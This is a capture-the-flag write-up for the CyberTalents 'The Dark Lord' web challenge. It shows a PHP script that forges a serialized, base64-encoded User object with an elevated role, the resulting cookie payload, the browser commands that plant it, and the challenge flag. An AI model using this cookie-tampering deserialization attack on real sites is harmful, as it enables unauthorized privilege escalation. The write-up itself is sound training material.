# CyberTalents The Dark Lord

#### Let's start with opening `http://52.28.216.196/darklord/`

## (1) Discovering

![Website Picture](https://github.com/Ahmedwaleed22/The-Dark-Lord/blob/master/pic1.png)

<p>As we can see it looks like that it's a normal page nothing strange in it let's check the source code</p>

![Source Code Picture](https://github.com/Ahmedwaleed22/The-Dark-Lord/blob/master/pic2.png)

<p>I found that there is a link to "source.php" let's check it</p>

![Source.php File Picture](https://github.com/Ahmedwaleed22/The-Dark-Lord/blob/master/pic3.png)

<p>As we can see it has php code with some html let's check what can we do with it</p>

<p>There is a class called user that has a private variable called "role" and it has value of "Guest", and there is a "GetInfo" method that checks if you have "Voldemort" role or not and return something according to that</p>

<p>Then we have another piece of php code checking if user have "user" cookie and if it exists it decode it and then unserializing it. and if "user" cookie not exists it create a user with the default role (Guest)</p>

## (2) Coding

<p>Now we can take the user class, edit the role to "Voldemort" then serializing and then encoding it let's try to do that with the following code</p>

```php
<?php

class User
{
    private $role = "Voldemort";

    public function GetInfo()
    {
        include("titles.php");

        if($this->role === "Voldemort")
        {
            return $Title_A;
        }
        else
        {
            return $Title_B;
        }
    }

}

$user = new User();

$solution = base64_encode(serialize($user));

echo $solution;
```

### It printed out `Tzo0OiJVc2VyIjoxOntzOjEwOiIAVXNlcgByb2xlIjtzOjk6IlZvbGRlbW9ydCI7fQ==`


## (3) Exploiting

<p>There is two ways to exploit it</p>

### (1) Using "Cookie Editor" Extention

<p>You can add new cookie named "user" and asign "Tzo0OiJVc2VyIjoxOntzOjEwOiIAVXNlcgByb2xlIjtzOjk6IlZvbGRlbW9ydCI7fQ==" to it's value.</p>

![Exploiting with "Cookie Editor"](https://github.com/Ahmedwaleed22/The-Dark-Lord/blob/master/pic4.png)

### (2) Using browser console

<p>You can easily execute the following code in the browser console</p>

#### `document.cookie = "user=Tzo0OiJVc2VyIjoxOntzOjEwOiIAVXNlcgByb2xlIjtzOjk6IlZvbGRlbW9ydCI7fQ=="`

# That's it

![Flag](https://github.com/Ahmedwaleed22/The-Dark-Lord/blob/master/pic5.png)

## Flag: FL@G{S3r!alizat!on_!s_D@ng3r0us}

